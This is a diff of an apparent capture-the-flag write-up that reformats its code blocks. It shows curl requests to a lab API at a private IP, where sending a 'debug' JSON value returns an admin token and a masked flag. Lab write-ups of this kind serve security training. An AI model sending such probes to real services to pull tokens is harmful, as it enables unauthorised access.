@@ -17,7 +17,9 @@
 
 1. trying a simple curl
     ```bash
-    $ curl -X POST http://10.48.136.93:5003/api/process 
+    $ curl -X POST http://10.48.136.93:5003/api/process
+    ```
+    ```
     {
       "error": "415 Unsupported Media Type: Did not attempt to load JSON data because the request Content-Type was not 'application/json'."
     }
@@ -25,6 +27,8 @@
 2. add a JSON header
     ```bash
     $ curl -X POST http://10.48.136.93:5003/api/process -H "Content-Type:application/json"
+    ```
+    ```
     {
       "error": "400 Bad Request: Failed to decode JSON object: Expecting value: line 1 column 1 (char 0)"
     }
@@ -39,6 +43,8 @@
 4. I don't know what was that and how the script work, but I tried
     ```bash
     $ curl -X POST http://10.48.136.93:5003/api/process -H "Content-Type: application/json" -d '{"data":"debug"}'
+    ```
+    ```
     {
       "admin_token": "admin_token_12345",
       "flag": "THM{ xxxxxxx}",
